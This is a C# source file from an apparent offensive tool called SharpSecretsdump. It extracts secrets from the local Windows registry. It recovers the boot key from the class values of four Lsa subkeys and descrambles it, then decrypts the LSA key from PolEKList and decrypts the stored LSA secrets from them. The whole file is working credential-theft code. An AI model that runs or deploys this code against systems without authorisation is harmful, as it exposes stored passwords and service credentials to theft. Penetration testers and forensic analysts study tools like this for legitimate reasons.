using System;
using System.ComponentModel;
using System.Runtime.InteropServices;
using System.Text;

namespace SharpSecretsdump
{
    public class LSADump
    {
        public static byte[] GetLSASecret(string secretName, byte[] LSAKey)
        {
            string keyPath = String.Format("SECURITY\\Policy\\Secrets\\{0}\\CurrVal", secretName);
            byte[] keyData = Helpers.GetRegKeyValue(keyPath);

            if (keyData == null)
                return null;

            byte[] keyEncryptedData = new byte[keyData.Length - 28];
            Array.Copy(keyData, 28, keyEncryptedData, 0, keyEncryptedData.Length);

            // calculate the temp key by using the LSA key to calculate the Sha256 hash on the first 32 bytes
            //  of the extracted secret data
            byte[] keyEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(keyEncryptedData, 0, keyEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(LSAKey, keyEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the plaintext
            byte[] keyEncryptedDataRemainder = new byte[keyEncryptedData.Length - 32];
            Array.Copy(keyEncryptedData, 32, keyEncryptedDataRemainder, 0, keyEncryptedDataRemainder.Length);
            byte[] keyPathPlaintext = Crypto.LSAAESDecrypt(tmpKey, keyEncryptedDataRemainder);

            return keyPathPlaintext;
        }

        public static byte[] GetLSAKey(byte[] bootkey)
        {
            byte[] LSAKeyEncryptedStruct = Helpers.GetRegKeyValue(@"SECURITY\Policy\PolEKList");
            byte[] LSAEncryptedData = new byte[LSAKeyEncryptedStruct.Length-28];
            Array.Copy(LSAKeyEncryptedStruct, 28, LSAEncryptedData, 0, LSAEncryptedData.Length);

            // calculate the temp key by using the boot key to calculate the Sha256 hash on the first 32 bytes
            //  of the LSA key data
            byte[] LSAEncryptedDataEncryptedKey = new byte[32];
            Array.Copy(LSAEncryptedData, 0, LSAEncryptedDataEncryptedKey, 0, 32);
            byte[] tmpKey = Crypto.LSASHA256Hash(bootkey, LSAEncryptedDataEncryptedKey);

            // use the temp key to decrypt the rest of the LSA struct
            byte[] LSAEncryptedDataRemainder = new byte[LSAEncryptedData.Length-32];
            Array.Copy(LSAEncryptedData, 32, LSAEncryptedDataRemainder, 0, LSAEncryptedDataRemainder.Length);
            byte[] IV = new byte[16];
            byte[] LSAKeyStructPlaintext = Crypto.LSAAESDecrypt(tmpKey, LSAEncryptedDataRemainder);

            byte[] LSAKey = new byte[32];
            Array.Copy(LSAKeyStructPlaintext, 68, LSAKey, 0, 32);

            return LSAKey;
        }

        public static byte[] GetBootKey()
        {
            // returns the system boot key (aka syskey) that's later used to calculate the LSA key

            StringBuilder scrambledKey = new StringBuilder();

            foreach (string key in new string[] { "JD", "Skew1", "GBG", "Data" })
            {
                string keyPath = String.Format("SYSTEM\\CurrentControlSet\\Control\\Lsa\\{0}", key);
                StringBuilder classVal = new StringBuilder(1024);
                int len = 1024;
                int result = 0;
                IntPtr hKey = IntPtr.Zero;
                IntPtr dummy = IntPtr.Zero;

                // open the specified key with read (0x19) privileges
                //  0x80000002 == HKLM
                result = Interop.RegOpenKeyEx(0x80000002, keyPath, 0, 0x19, ref hKey);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("Error opening {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }

                result = Interop.RegQueryInfoKey(hKey, classVal, ref len, 0, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, ref dummy, IntPtr.Zero);
                if (result != 0)
                {
                    int error = Marshal.GetLastWin32Error();
                    string errorMessage = new Win32Exception((int)error).Message;
                    Console.WriteLine("Error enumerating {0} ({1}) : {2}", keyPath, error, errorMessage);
                    return null;
                }
                Interop.RegCloseKey(hKey);

                scrambledKey.Append(classVal);
            }

            // reference: https://github.com/brandonprry/gray_hat_csharp_code/blob/e1d5fc2a497ae443225d840718adde836ffaeefe/ch14_reading_offline_hives/Program.cs#L74-L82
            byte[] skey = Helpers.StringToByteArray(scrambledKey.ToString());
            byte[] descramble = new byte[] { 0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3,
                                             0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 };

            byte[] bootkey = new byte[16];
            for (int i = 0; i < bootkey.Length; i++)
                bootkey[i] = skey[descramble[i]];

            return bootkey;
        }
    }
}
